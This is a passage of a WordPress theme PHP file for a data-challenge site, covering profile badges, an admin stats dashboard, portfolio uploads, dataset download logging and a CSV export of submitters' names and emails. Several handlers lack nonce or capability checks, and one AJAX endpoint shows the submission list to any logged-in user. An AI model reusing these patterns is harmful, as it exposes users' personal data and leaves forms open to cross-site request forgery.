                            <div class="achievements-card">
                                <img src="<?php echo esc_url($badge_images[$badge_name]); ?>" 
                                     class="badge-icon" alt="<?php echo esc_attr($badge_name); ?>">
                                <p><?php echo esc_html($badge_name); ?> 
                                    <span>(<?php echo $count; ?>)</span>
                                </p>
                            </div>
                        </div>
                    <?php endif; ?>
                <?php endforeach; ?>
            </div>
                   
                <!-- </div> -->




            </div>
        </div>
    </div>
    

        <style>
            .table-striped th {text-align:center;}
           .badges-points-section table.table.table-striped tr:first-child td{border-left: none !important;}
           table tr:first-child td{border-left: none !important;}


   table.table-striped tr:first-child td{border-left:none !important;}
           .profile-sidebar {
            background-color: #ffffff;
            border: 1px solid #f0f0f0;
            margin-bottom: 30px;
            overflow: hidden;
            border-radius: 4px;
            box-shadow: 0px 10px 40px 10px rgba(0, 0, 0, 0.0784313725);
        }

        #profile {
            padding: 70px 0 20px;
        }

        #profile .profile-sidebar .widget-profile {
            border-bottom: 1px solid #f0f0f0;
            margin: 0;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
        }

        #profile .profile-sidebar .profile-inner-box {

            display: block !important;
            text-align: center !important;

        }

        #profile .profile-sidebar .profile-inner-box .profile-pic {
            display: inline-block;
            width: auto;
            background-color: #f7f7f7;
            margin: 0 0 15px !important;
            padding: 8px;
            border-radius: 50%;
        }
        #profile .profile-sidebar .profile-inner-box .profile-pic img {
            height: 120px !important;
            width: 120px !important;
            border-radius: 50% !important;
        }
        .profile-det-info h3 {
            font-size: 17px;
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
            font-weight: 600;
            line-height: 25px;
        }

        .profile-det-info .mobile-number {
            color: #757575;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .profile-sidebar .dashboard-widget {
            /*padding:15px;*/
        }

        .profile-sidebar .dashboard-widget .dashboard-menu ul {
            color: #757575;
            font-size: 14px;
            line-height: 17px;
            list-style: none;
            text-transform: capitalize;
            margin: 0;
            padding: 0;
        }

        .profile-sidebar .dashboard-widget .dashboard-menu>ul>li {
            position: relative;
            /*border:1px solid #f0f0f0;*/

            margin: 4px 14px;
            transition: .5s;
            cursor: pointer;
        }

        .profile-sidebar .dashboard-widget .dashboard-menu>ul>li a {
            color: #334155;
            display: block;
            border-radius: 10px;
            font-size: 16px;
            padding: 16px 16px;
            font-weight: 500;
        }
        .profile-card {
            border: 1px solid #E2E8F0;
            margin: 0 0 24px;
            padding: 24px 24px 24px;
            border-radius: 10px;
        box-shadow: 0px 7.5px 17.5px 0px rgba(0, 0, 0, 0.0509803922);
        }
        .profile-card .change-avatar {
            display: flex;
            align-items: center;}
        .profile-card .change-avatar .profile-img {
            margin-right: 30px;
        }
        .profile-card .change-avatar .profile-img img {
            height: 100px;
            width: 100px;
            object-fit: cover;
            border-radius: 4px;
        }
        .profile-card .change-avatar .change-photo-btn {
            margin: 0 0 10px;
            width: 150px;
            background-color: #ffbb09;
            color: #ffffff;
            cursor: pointer;
            display: block;
            font-size: 13px;
            font-weight: 600;
            position: relative;
            text-align: center;
            /* width: 165px; */
            -webkit-transition: 0.3s;
            -ms-transition: 0.3s;
            transition: 0.3s;
            border-radius: 50px;
            padding: 10px 15px;
        }

        .profile-card .change-avatar .change-photo-btn input.upload {
            bottom: 0;
            cursor: pointer;
            filter: alpha(opacity=0);
            opacity: 0;
            width: 220px;
            margin: 0;
            padding: 0;
            position: absolute;
            top: 0;
            right: 0;
            left: 0;
        }

        .profile-detail {
            border: 1px solid #E2E8F0;
            margin: 0 0 24px;
            padding: 24px 24px 24px;
            border-radius: 10px;
        box-shadow: 0px 7.5px 17.5px 0px rgba(0, 0, 0, 0.0509803922);
            background: #fff;
        }
        .profile-detail label {
            font-size: 16px;
        }
        .profile-detail .form-control {
            border-color: #E2E8F0;
            border-radius: 6px;
            padding: 7px 15px;
            height: 50px;
            box-shadow: none;
        }

        .profile-detail textarea {
            height: 81px !important;
        }

        .profile-detail .form-control:focus {
            border: 1.5px solid #ffbb09;
        }

        .change-photo-btn small {
            font-size: 14px;
        }

        .work-histroy {
            font-size: 18px;
            color: #777777;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .profile-sidebar .dashboard-widget .dashboard-menu>ul>li a:hover { color: #ffbb09;}
        .profile-sidebar .dashboard-widget .dashboard-menu>ul>li a {
            transition: .4s;}
        .profile-sidebar .dashboard-widget .dashboard-menu>ul>li:hover a,
        .profile-sidebar .dashboard-widget .dashboard-menu>ul>li.active>a {color: #fff;background: #ffbb09;border-radius: 10px;}
        .add-icon i {
            width: 31px;
            height: 31px;
            border-radius: 50%;
            background: #ffbb09;
            text-align: center;
            color: #fff;
            font-size: 15px;
            line-height: 31px;
            margin-left: 8px;
        }
        textarea::placeholder {color: rgba(0, 0, 0, 0.5);}
        .tabs-profile .nav-link.active {
            background: #ffbb09;
            color: #fff;
            border-radius: 8px;}
        .tabs-profile .nav-link {
            border: 1px solid #ffbb09 !important;
            color: #ffbb09;}

        .custom-checkbox {
            display: none;}

        .custom-checkbox+.form-check-label {
            position: relative;
            padding-left: 30px;
            cursor: pointer;
        }
        .custom-checkbox+.form-check-label::before {
            content: "";
            position: absolute;
            left: 0;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
            border: 2px solid #ffbb09;
            border-radius: 4px;
            background-color: #fff;
            box-sizing: border-box;
            transition: all 0.3s ease;
        }
        .custom-checkbox:checked+.form-check-label::before {
            background-color: #ffbb09;
            border-color: #ffbb09;
        }
        .custom-checkbox:checked+.form-check-label::after {
            content: "✓";
            position: absolute;
            left: 3px;
            top: 50%;
            transform: translateY(-50%);
            color: #fff;
            font-size: 14px;
        }
        /* select dropdown */
        .onboard-hiring .select {
            position: relative;
            margin-bottom: 15px;
            border: 1px solid #dee1e6;
            font-size: 14px;
            border: 0.0625rem solid rgba(48, 61, 93, .25);

        }
        .onboard-hiring .select .selectBtn {
            background: var(--bg1);
            padding: 0.9375rem 1.25rem;
            box-sizing: border-box;
            border-radius: 3px;
            width: 100%;
            cursor: pointer;
            position: relative;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            background: #fff;
            color: #444444
        }
        .onboard-hiring .select .selectBtn:after {
            content: "";
            position: absolute;
            top: 45%;
            right: 15px;
            width: 6px;
            height: 6px;
            -webkit-transform: translateY(-50%) rotate(45deg);
            transform: translateY(-50%) rotate(45deg);
            border-right: 2px solid #666;
            border-bottom: 2px solid #666;
            transition: 0.2s ease;
        }
        .onboard-hiring .select .selectBtn.toggle {
            border-radius: 3px 3px 0 0;
        }
        .onboard-hiring .select .selectBtn.toggle:after {
            -webkit-transform: translateY(-50%) rotate(-135deg);
            transform: translateY(-50%) rotate(-135deg);
        }
        .onboard-hiring .select .selectDropdown {
            position: absolute;
            top: 100%;
            width: 100%;
            border-radius: 0 0 3px 3px;
            overflow: hidden;
            background: var(--bg1);
            border-top: 1px solid #eee;
            z-index: 1;
            background: #fff;
            -webkit-transform: scale(1, 0);
            transform: scale(1, 0);
            -webkit-transform-origin: top center;
            transform-origin: top center;
            visibility: hidden;
            transition: 0.2s ease;
            box-shadow: 0 3px 3px rgba(0, 0, 0, 0.2);
        }
        .onboard-hiring .select .selectDropdown .option {
            padding: 10px;
            box-sizing: border-box;
            cursor: pointer;
        }
        .onboard-hiring .select .selectDropdown .option:hover {
            background: #f8f8f8;
        }

        .onboard-hiring .select .selectDropdown.toggle {
            visibility: visible;
            -webkit-transform: scale(1, 1);
            transform: scale(1, 1);
        }

        tbody, td, tfoot, th, thead, tr {
    border: 1px solid #f5f5f5;
}
.table-striped>tbody>tr:nth-of-type(odd)>* {
    --bs-table-bg-type: transparent;
    background: #f8f8f8;
}

table td, table th{ 
    text-align: center;
}
.points{
    background: #ffbb09;
    font-size: 14px;
    padding: 5px 13px;
}

.achievements-card {
    background: #f5f5f5;
    padding: 6px;
    border-radius: 10px;
    height: 100%;
}
.achievements-card img{
    width: 113px;
    height: 100px;
    object-fit: contain;
}
.achievements-card p{  
    font-weight: 600;
    margin: 20px auto;
}
 </style>

<?php }
   if ($type === 'admin_dashboard') {
if (current_user_can('administrator')) {
  ?>
  <div class="stats-dashboard">
    <?php
    global $wpdb;

    // Total users
    $total_users = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->users");

    // Total published challenges
    $total_challenges = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->posts WHERE post_type = 'challenges' AND post_status = 'publish'");

    $total_submissions = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}datadna_challenges_entry_data");

    $challenge_submissions = $wpdb->get_results("
        SELECT p.ID, p.post_title, COUNT(e.id) as submissions
        FROM $wpdb->posts p
        LEFT JOIN {$wpdb->prefix}datadna_challenges_entry_data e ON e.post_id = p.ID
        WHERE p.post_type = 'challenges' AND p.post_status = 'publish'
        GROUP BY p.ID, p.post_title
        ORDER BY submissions DESC
    ");
    ?>

    <div class="stats-summary">
        <div class="stat-card">
            <h3>Total Users</h3>
            <div class="stat-value"><?php echo number_format($total_users); ?></div>
        </div>
        
        <div class="stat-card">
            <h3>Published Challenges</h3>
            <div class="stat-value"><?php echo number_format($total_challenges); ?></div>
        </div>
        
        <div class="stat-card">
            <h3>Total Submissions</h3>
            <div class="stat-value"><?php echo number_format($total_submissions); ?></div>
        </div>
    </div>
    
    <div class="challenge-stats">
        <h2>Submissions Per Challenge</h2>
        <div class="stats-table">
            <div class="stats-row header">
                <div class="stats-cell">Challenge Title</div>
                <div class="stats-cell">Submissions</div>
                <div class="stats-cell">Participation Rate</div>
            </div>
            
            <?php foreach ($challenge_submissions as $challenge): 
                $participation_rate = ($total_users > 0) ? round(($challenge->submissions / $total_users) * 100, 1) : 0;
                ?>
                <div class="stats-row">
                    <div class="stats-cell"><?php echo esc_html($challenge->post_title); ?></div>
                    <div class="stats-cell"><?php echo number_format($challenge->submissions); ?></div>
                    <div class="stats-cell">
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: <?php echo $participation_rate; ?>%"></div>
                            <span><?php echo $participation_rate; ?>%</span>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
</div>
<style>.stats-dashboard {
    max-width: 1200px;
    margin: 20px auto;
    padding: 20px;
    background: #f8f9fa;
    border-radius: 10px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}

.stats-summary {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.stat-card {
    background: white;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
    text-align: center;
}

.stat-card h3 {
    margin-top: 0;
    color: #6c757d;
    font-size: 16px;
}

.stat-value {
    font-size: 32px;
    font-weight: bold;
    color: #2c3e50;
}

.challenge-stats {
    background: white;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
}

.challenge-stats h2 {
    margin-top: 0;
    color: #2c3e50;
    border-bottom: 1px solid #eee;
    padding-bottom: 10px;
}

.stats-table {
    display: flex;
    flex-direction: column;
}

.stats-row {
    display: flex;
    padding: 12px 0;
    border-bottom: 1px solid #eee;
    align-items: center;
}

.stats-row.header {
    font-weight: bold;
    background-color: #f1f3f5;
}

.stats-cell {
    flex: 1;
    padding: 0 10px;
}

.progress-bar {
    height: 24px;
    background: #e9ecef;
    border-radius: 12px;
    position: relative;
    overflow: hidden;
}

.progress-fill {
    height: 100%;
    background: #4e73df;
    border-radius: 12px 0 0 12px;
}

.progress-bar span {
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    color: #000;
    font-size: 12px;
    font-weight: bold;
    text-shadow: 0 0 2px rgba(0,0,0,0.3);
}

@media (max-width: 768px) {
    .stats-summary {
        grid-template-columns: 1fr;
    }
    
    .stats-cell {
        font-size: 14px;
    }
}
</style><?php
   }
}

if ($type === 'social_media_section') {
        // Get current user ID
        $user_id = get_current_user_id();
        
        // Get existing social media URLs (if any)
        $facebook_url = get_user_meta($user_id, 'facebook_url', true);
        $instagram_url = get_user_meta($user_id, 'instagram_url', true);
        $twitter_url = get_user_meta($user_id, 'twitter_url', true);
        $linkedin_url = get_user_meta($user_id, 'linkedin_url', true);

        // Start output buffering
        ?>
      
        <form method="post" class="uwp-social-media-form">
            <div class="social-media-row">
                <label class="social-media-label"><i class="fab fa-facebook-f"></i></label>
                <input type="url" name="facebook_url" value="<?php echo esc_url($facebook_url); ?>" class="social-media-input" placeholder="https://facebook.com/yourprofile">
            </div>
            <div class="social-media-row">
                <label class="social-media-label"><i class="fab fa-instagram"></i></label>
                <input type="url" name="instagram_url" value="<?php echo esc_url($instagram_url); ?>" class="social-media-input" placeholder="https://instagram.com/yourprofile">
            </div>
            <div class="social-media-row">
                <label class="social-media-label"><i class="fa-brands fa-x-twitter"></i></label>
                <input type="url" name="twitter_url" value="<?php echo esc_url($twitter_url); ?>" class="social-media-input" placeholder="https://twitter.com/yourprofile">
            </div>
            <div class="social-media-row">
                <label class="social-media-label"><i class="fab fa-linkedin-in"></i></label>
                <input type="url" name="linkedin_url" value="<?php echo esc_url($linkedin_url); ?>" class="social-media-input" placeholder="https://linkedin.com/in/yourprofile">
            </div>
            <div class="social-media-submit">
                <input type="submit" name="submit_social_media" value="Save Changes" class="btn btn-primary">
            </div>
        </form>

        <style>
    

.uwp-social-media-form {
                max-width: 600px;
                margin: 0 auto;
            }
            .social-media-row {
                display: flex;
                align-items: center;
                margin-bottom: 20px;
            }
            .social-media-label {
                width: 50px;
                text-align: center;
            }
            .social-media-label i {
                font-size: 20px;
                color: #555;
            }
            .social-media-input {
                flex: 1;
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 14px;
            }
           
            .btn-primary {
                padding: 10px 20px;
                background-color: #007bff;
                color: #fff;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            .btn-primary:hover {
                background-color: #0056b3;
            }
            .uwp-success-msg {
                color: #28a745;
                margin-top: 10px;
            }
            .uwp-social-media-display h4 {
                font-size: 1.5rem;
                margin-bottom: 15px;
                color: #333;
            }
            .social-media-links {
                list-style: none;
                padding: 0;
            }
            .social-media-links li {
                margin-bottom: 10px;
            }
            .social-media-links a {
                display: flex;
                align-items: center;
                text-decoration: none;
                color: #007bff;
                transition: color 0.3s;
            }
            .social-media-links a:hover {
                color: #0056b3;
            }
            .social-media-links i {
                width: 20px;
                margin-right: 10px;
                color: #555;
            }</style>

        <?php
        // Handle form submission
        if (isset($_POST['submit_social_media'])) {

            $new_facebook = esc_url_raw($_POST['facebook_url']);
            $new_instagram = esc_url_raw($_POST['instagram_url']);
            $new_twitter = esc_url_raw($_POST['twitter_url']);
            $new_linkedin = esc_url_raw($_POST['linkedin_url']);

            update_user_meta($user_id, 'facebook_url', $new_facebook);
            update_user_meta($user_id, 'instagram_url', $new_instagram);
            update_user_meta($user_id, 'twitter_url', $new_twitter);
            update_user_meta($user_id, 'linkedin_url', $new_linkedin);



            echo '<p class="uwp-success-msg">' . __('Social media URLs updated successfully!', 'userswp') . '</p>';
        }

        
    }


}
add_filter('uwp_account_form_display', 'custom_uwp_tab_content', 10, 1);


// Code for changing the links of profile to match our required format in userwp plugin
function fix_user_profile_links() {
    ?>
    <script>
    document.addEventListener("DOMContentLoaded", function() {
        // Get all profile & author links
        let profileLinks = document.querySelectorAll("a.text-muted, a.text-decoration-none");

        profileLinks.forEach(function(link) {
            let currentHref = link.getAttribute("href");

            // Match URLs like /profile/username/
            let profileMatch = currentHref.match(/\/profile\/([^\/]+)\/?$/);
            
            // Match URLs like /author/username/
            let authorMatch = currentHref.match(/\/author\/([^\/]+)\/?$/);

            if (profileMatch) {
                let username = profileMatch[1];
                let newHref = "https://datadna.onyxdata.co.uk/profile/?uwp_profile=" + username;
                link.setAttribute("href", newHref);
            }

            if (authorMatch) {
                let username = authorMatch[1];
                let newHref = "https://datadna.onyxdata.co.uk/profile/?uwp_profile=" + username;
                link.setAttribute("href", newHref);
            }
        });
    });

    </script>

    <?php
}
add_action('wp_footer', 'fix_user_profile_links');



function save_portfolio_submission() {
    if (!is_user_logged_in()) {
        wp_send_json_error(['message' => 'You must be logged in to submit a portfolio.']);
    }

    $user_id = get_current_user_id();

    $portfolio_title = sanitize_text_field($_POST['portfolio_title']);
    $portfolio_description = sanitize_textarea_field($_POST['portfolio_description']);
    $portfolio_url = esc_url($_POST['portfolio_url']);
    $skills = isset($_POST['skills']) ? array_map('sanitize_text_field', $_POST['skills']) : [];
    $powerbi_report_url = esc_url($_POST['powerbi_report_url']); // Get Power BI link

   $challenge_id = !empty($_POST['challenge']) ? intval($_POST['challenge']) : ''; // Single challenge


    $post_id = wp_insert_post([
        'post_title'   => $portfolio_title,
        'post_content' => $portfolio_description,
        'post_status'  => 'publish',
        'post_type'    => 'portfolios',
        'post_author'  => $user_id,
    ]);

    if (!$post_id) {
        wp_send_json_error(['message' => 'Failed to create portfolio.']);
    }

    // Save ACF Fields
    update_field('skills_and_tools', $skills, $post_id);
    update_field('description', $portfolio_description, $post_id);
    update_field('portfolio_url', $portfolio_url, $post_id);

    //update_field('associated_challenges', $challenges, $post_id);

    if ($challenge_id) {
            $challenge_title = get_the_title($challenge_id);
            $challenge_string = "$challenge_title (ID: $challenge_id)";
            update_field('associated_challenges', $challenge_string, $post_id);
        } else {
            update_field('associated_challenges', '', $post_id); // Empty if no challenge
    }
    // Handle Featured Image
    if (!empty($_FILES['portfolio_thumbnail']['name'])) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $thumbnail_id = media_handle_upload('portfolio_thumbnail', $post_id);
        if (!is_wp_error($thumbnail_id)) {
            set_post_thumbnail($post_id, $thumbnail_id);
        }
    }



   // Handle Portfolio Images inside ACF Repeater
if (!empty($_FILES['portfolio_images']['name'][0])) {
    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/media.php';
    require_once ABSPATH . 'wp-admin/includes/image.php';

    $images = [];
    foreach ($_FILES['portfolio_images']['name'] as $key => $value) {
        $_FILES['file'] = [
            'name'     => $_FILES['portfolio_images']['name'][$key],
            'type'     => $_FILES['portfolio_images']['type'][$key],
            'tmp_name' => $_FILES['portfolio_images']['tmp_name'][$key],
            'error'    => $_FILES['portfolio_images']['error'][$key],
            'size'     => $_FILES['portfolio_images']['size'][$key],
        ];
        $image_id = media_handle_upload('file', $post_id);
        if (!is_wp_error($image_id)) {
            $images[] = $image_id; // Store image ID
        }
    }

    // Save into ACF repeater field
    if (!empty($images)) {
        $repeater_data = [];
        foreach ($images as $index => $image_id) {
            $repeater_data[] = [
                'image' => $image_id, // Save each image in the repeater row
            ];
        }
        update_field('portfolio_images', $repeater_data, $post_id);
    }
}



// Handle Power BI Report File Upload
    if (!empty($_FILES['powerbi_report']['name'])) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $file_id = media_handle_upload('powerbi_report', $post_id);
        if (!is_wp_error($file_id)) {
            update_field('powerbi_report_file', $file_id, $post_id); // Save file ID to ACF field
        }
    }


    // Handle Power BI Report Link
    if (!empty($powerbi_report_url)) {
        update_field('powerbi_report_url', $powerbi_report_url, $post_id); // Save URL to ACF field
        }

    wp_send_json_success(['message' => 'Portfolio submitted successfully!']);
    wp_die();
}

add_action('wp_ajax_save_portfolio_submission', 'save_portfolio_submission');
add_action('wp_ajax_nopriv_save_portfolio_submission', 'save_portfolio_submission');


// 
function allow_pbix_uploads($mimes) {
    $mimes['pbix'] = 'application/octet-stream';
    return $mimes;
}
add_filter('upload_mimes', 'allow_pbix_uploads');
// 


add_action('wp_ajax_handle_dataset_download', 'handle_dataset_download');
add_action('wp_ajax_nopriv_handle_dataset_download', 'handle_dataset_download');

function handle_dataset_download() {

    if (!is_user_logged_in()) {
        $login_url = home_url('/login/'); // Replace with your actual login page URL
        $message = 'Please <a href="' . esc_url($login_url) . '">login</a> to download the dataset.';
        
        wp_send_json_error([
            'message' => 'Please Login to download the dataset.',
            'login_required' => true,
            'login_url' => $login_url
        ]);
    }
   
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Validate form data
        if (empty($_POST['fullname']) || empty($_POST['email']) || empty($_POST['visualisation_tool'])) {
            wp_send_json_error('Please fill out all fields.');
        }

        // Get the post ID
        $post_id = intval($_POST['post_id']);
        if (!$post_id) {
            wp_send_json_error('Invalid post ID.');
        }

         // Get the challenge date from ACF
        $challenge_date = get_field('challenges_date', $post_id); 
       if (!$challenge_date) {
           wp_send_json_error('Challenge date not found.');
        }

        // Convert challenge date to timestamp
        $submission_timestamp = strtotime(str_replace("/", "-", $challenge_date));
        $today_timestamp = time(); // Current timestamp

        // Check if submission deadline is over
       if ($submission_timestamp < $today_timestamp) {
            wp_send_json_error('Submission deadline is over.');
        }

        // Get the zip file URL from ACF
        $zip_file_url = get_field('dataset_zip_file', $post_id);
        if (!$zip_file_url) {
            wp_send_json_error('No dataset file found.');
        }

        // Update download count
    $download_count = get_post_meta($post_id, 'dataset_download_count', true);
    $download_count = $download_count ? intval($download_count) + 1 : 1; // Increment count
    update_post_meta($post_id, 'dataset_download_count', $download_count);

    $post_name = get_the_title($post_id);

    // Handle multiple visualisation tools
    $visualisation_tools = isset($_POST['visualisation_tool']) ? (array) $_POST['visualisation_tool'] : array();
    $visualisation_tools = array_map('sanitize_text_field', $visualisation_tools); // Sanitize each value
    $tools_string = implode(', ', $visualisation_tools); 

// Save form submission data to custom table
        global $wpdb;
        $table_name = $wpdb->prefix . 'dataset_download_form_submissions';

        $wpdb->insert(
            $table_name,
            array(
                'fullname' => sanitize_text_field($_POST['fullname']),
                'email' => sanitize_email($_POST['email']),
               'visualisation_tool' => $tools_string, // Save as comma-separated string
                'post_id' => $post_id,
                'post_name' => $post_name,
            )
        );


        wp_send_json_success([
            'message' => 'Dataset Downloaded!',
            'redirect_url' => $zip_file_url, // Redirect to the zip file URL
        ]);
    }
}

//Create the table to store the Users information who download the zip 
//throgh the dataset download form
 


function display_form_submissions_page() {
    // Check if CSV export is triggered
    if (isset($_POST['export_csv']) && $_POST['export_csv'] == 1 && isset($_POST['export_csv_nonce']) && wp_verify_nonce($_POST['export_csv_nonce'], 'export_csv_nonce')) {
        export_form_submissions_csv();
        exit; // Stop further output
    }

    ?>
    <div class="wrap">
        <h1>Form Submissions data for downloaded datasets</h1>

<div style="margin-bottom: 20px;text-align: right;">
          <!--   <form method="post" action="">
                <input type="hidden" name="export_csv" value="1">
                <button type="submit" class="button button-primary">Export to CSV</button>
            </form> -->
             <button class="button button-primary export-csv-btn" onclick="window.location.href='<?php echo esc_url(admin_url('admin-post.php?action=export_form_submissions_csv')); ?>'">
                Export CSV
            </button>
        </div>

        <div class="form-table-wrapper">
            <div id="admin-loading-overlay"><div class="spinner"></div></div>
            <div id="form-submission-table-container">
                <?php echo get_form_submissions_html(1); ?>
            </div>
        </div>
    </div>
    <?php

}

add_action('admin_post_export_form_submissions_csv', 'export_form_submissions_csv');

function export_form_submissions_csv() {
    // Check user permissions
    if (!current_user_can('edit_posts')) {
        wp_die('Permission denied.');
    }

   

    global $wpdb;
    $table_name = $wpdb->prefix . 'dataset_download_form_submissions';
   

    // Fetch all submissions
    $submissions = $wpdb->get_results("SELECT * FROM $table_name ORDER BY submission_date DESC");

    // Check for database errors or empty data
    if (!$submissions && $wpdb->last_error) {
        error_log('Database error: ' . $wpdb->last_error);
        wp_die('Database error: ' . esc_html($wpdb->last_error));
    }
    if (empty($submissions)) {
        wp_die('No submissions to export.');
    }

    // Debug: Log number of submissions
    error_log('Submissions found: ' . count($submissions));

    // Clear output buffer to prevent headers issue
    if (ob_get_length()) {
        ob_clean();
    }

    // Set headers for CSV download
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="form_submissions_' . date('Y-m-d_H-i-s') . '.csv"');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');

    // Open output stream
    $output = fopen('php://output', 'w');

    if (!$output) {
        error_log('Failed to open php://output');
        wp_die('Error generating CSV file.');
    }

    // Add BOM for UTF-8 encoding (Excel compatibility)
    fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF));

    // Write CSV headers
    $headers = array(
        'Serial',
        'Name',
        'Email',
        'Visualisation Tool',
        'Submission Date',
        'Post ID',
        'Post Name'
    );
    fputcsv($output, $headers);

    // Write data rows
    foreach ($submissions as $entry) {
        $row = array(
            $entry->id,
            $entry->fullname,
            $entry->email,
            $entry->visualisation_tool,
            $entry->submission_date,
            $entry->post_id,
            $entry->post_name
        );
        fputcsv($output, $row);
    }

    // Close output stream
    fclose($output);
    exit;
}


function get_form_submissions_html($page) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'dataset_download_form_submissions';

    $per_page = 20;
    $offset = ($page - 1) * $per_page;

    $total = $wpdb->get_var("SELECT COUNT(*) FROM $table_name");
    $submissions = $wpdb->get_results(
        $wpdb->prepare("SELECT * FROM $table_name ORDER BY submission_date DESC LIMIT %d OFFSET %d", $per_page, $offset)
    );
    $total_pages = ceil($total / $per_page);

    ob_start();
    ?>
    <style>
        .form-table-wrapper { position: relative; min-height: 300px; }
        #admin-loading-overlay {
            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5); display: none;
            justify-content: center; align-items: center; z-index: 9999;
        }
        #admin-loading-overlay .spinner {
            border: 5px solid #f3f3f3; border-top: 5px solid #2271b1;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .custom-pagination {
            margin-top: 20px; display: flex; flex-wrap: wrap; gap: 5px;
        }
        .custom-pagination .pagination-button {
            background-color: #f3f4f6; border: 1px solid #ccc;
            padding: 6px 12px; cursor: pointer; border-radius: 3px;
        }
        .custom-pagination .pagination-button.active {
            background-color: #2271b1; color: white; font-weight: bold;
        }
        button.pagination-button:hover {
    background-color: #2271b1;
    color: white;
}
    </style>

    <table class="wp-list-table widefat fixed striped">
        <thead>
        <tr>
            <th>Serial</th><th>Name</th><th>Email</th>
            <th>Visualisation Tool</th><th>Submission Date</th>
            <th>Post ID</th><th>Post Name</th>
        </tr>
        </thead>
        <tbody>
        <?php foreach ($submissions as $submission): ?>
            <tr>
                <td><?= esc_html($submission->id); ?></td>
                <td><?= esc_html($submission->fullname); ?></td>
                <td><?= esc_html($submission->email); ?></td>
                <td><?= esc_html($submission->visualisation_tool); ?></td>
                <td><?= esc_html($submission->submission_date); ?></td>
                <td><?= esc_html($submission->post_id); ?></td>
                <td><?= esc_html($submission->post_name); ?></td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

    <div class="custom-pagination">
        <?php
        if ($page > 1) {
            echo '<button class="pagination-button" data-page="' . ($page - 1) . '">Prev</button>';
        }

        $ellipsis = false;
        for ($i = 1; $i <= $total_pages; $i++) {
            if ($i == 1 || $i == $total_pages || ($i >= $page - 2 && $i <= $page + 2)) {
                $class = ($i === $page) ? 'active' : '';
                echo '<button class="pagination-button ' . $class . '" data-page="' . $i . '">' . $i . '</button>';
                $ellipsis = false;
            } elseif (!$ellipsis) {
                echo '<span style="padding:6px;">...</span>';
                $ellipsis = true;
            }
        }

        if ($page < $total_pages) {
            echo '<button class="pagination-button" data-page="' . ($page + 1) . '">Next</button>';
        }
        ?>
    </div>
    <?php
    return ob_get_clean();
}

add_action('wp_ajax_load_form_submissions_page', 'ajax_load_form_submissions_page');
function ajax_load_form_submissions_page() {
    $page = isset($_POST['page_number']) ? intval($_POST['page_number']) : 1;
    echo get_form_submissions_html($page);
    wp_die();
}




function add_form_submissions_menu() {
    add_menu_page(
        'Dataset Download Form Submissions', 
        'Dataset Download Form Submissions', // Menu title
        'manage_options',   // Capability
        'dataset-download-form-submissions', // Menu slug
        'display_form_submissions_page', // Callback function
        'dashicons-list-view', // Icon
        6 // Position
    );
}
add_action('admin_menu', 'add_form_submissions_menu');




//Create table for saving the dataset challeng form data.

function create_challenge_table_once() {
    global $wpdb;
    
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';
    
    // Check if table already exists
    if ($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        $sql = "CREATE TABLE $table_name (
            id bigint(20) NOT NULL AUTO_INCREMENT,
            post_id bigint(20) NOT NULL,
            user_id bigint(20) NOT NULL,
            fullname varchar(255) NOT NULL,
            email varchar(255) NOT NULL,
            linkedin_url text,
            profile_url text,
            tool varchar(100),
            rating int(11),
            points int(11) DEFAULT 0,
            feedback text,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id)
        ) ".$wpdb->get_charset_collate().";";
        
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        
        // Optional: Add confirmation message
        add_action('admin_notices', function() {
            echo '<div class="notice notice-success"><p>Challenge table created successfully!</p></div>';
        });
    }
}

// Run this when admin loads (only creates table once)
add_action('admin_init', 'create_challenge_table_once');

add_action('wp_ajax_save_datadna_challenge_data_submit_entry', 'save_datadna_challenge_data_submit_entry');
add_action('wp_ajax_nopriv_save_datadna_challenge_data_submit_entry', 'save_datadna_challenge_data_submit_entry');

function save_datadna_challenge_data_submit_entry() {
    if (!is_user_logged_in()) {
        wp_send_json_error('User not logged in.');
    }

